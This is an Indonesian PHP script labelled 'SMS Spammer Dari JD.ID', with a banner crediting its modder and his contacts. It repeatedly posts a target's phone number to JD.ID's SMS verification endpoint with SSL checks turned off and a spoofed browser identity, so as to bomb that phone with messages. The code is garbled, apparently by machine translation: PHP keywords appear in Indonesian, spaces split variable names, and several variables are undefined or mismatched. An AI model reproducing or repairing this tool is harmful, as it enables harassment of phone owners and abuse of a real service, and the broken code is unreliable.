<? php
fungsi  jdidbom ( $ no , $ jum , $ wait ) {
    $ x  =  0 ;
    sementara ( $ x  <  $ jum ) {
        $ ch  =  curl_init ();
        curl_setopt ( $ ch , CURLOPT_URL , " http://sc.jd.id/phone/sendPhoneSms " );
        curl_setopt ( $ ch , CURLOPT_POST , 1 );
        curl_setopt ( $ ch , CURLOPT_POSTFIELDS , " phone = " . $ no . " & smsType = 1 " );
        curl_setopt ( $ ch , CURLOPT_RETURNTRANSFER , true );
		curl_setopt ( $ ch , CURLOPT_FOLLOWLOCATION , true );
		curl_setopt ( $ ch , CURLOPT_SSL_VERIFYPEER , 0 );
		curl_setopt ( $ ch , CURLOPT_SSL_VERIFYHOST , 0 );
        curl_setopt ( $ ch , CURLOPT_REFERER , ' http://sc.jd.id/phone/bindingPhone.html ' );
        curl_setopt ( $ ch , CURLOPT_USERAGENT , ' Mozilla / 5.0 (Windows NT 10.0; Win64; x64) AppleWebKit / 537.36 (KHTML, seperti Gecko) Chrome / 58.0.3029.110 Safari / 537.36 ' );
        $ server_output  =  curl_exec ( $ ch );
        curl_close ( $ ch );
		echo  $ server_output . " \ n " ;
        tidur ( $ wait );
        $ x ++ ;
        flush ();
    }
}
echo  "
################################################## ##########
    SMS Spammer Dari JD.ID
    Mod By: Rizky Tian
    Hubungi Saya: Rizkytian91@gmail.com
    panel smm: mastersosmed.com
    situs download mp3: www.mp3ku.xyz
    Instagram: @rizkytian_
    Terima kasih kepada: BabbyCyberTeam & SGB-TEAM
    Penggunaan: Awali Dengan Angka [8]
################################################## ########## \ n " ;
gema  " \ n  \ e [93M ------------------ \ n Contoh 81234678××× \ n -------- ---------- \ n \ n Jumlah Target: " ;
$ jumlah  =  trim ( fgets ( STDIN ));
echo  " Jumlah Paket: " ;
$ jumlah  =  trim ( fgets ( STDIN ));
echo  " Masukkan Jeda: " ;
$ jeda  =  trim ( fgets ( STDIN ));
echo  " \ e [93m____________________________________________________________ \ n " ;
$ mengeksekusi  = jdidbom ( $ nomor , $ Jangka Waktu , $ Jeda );
cetak  $ eksekusi ;
? >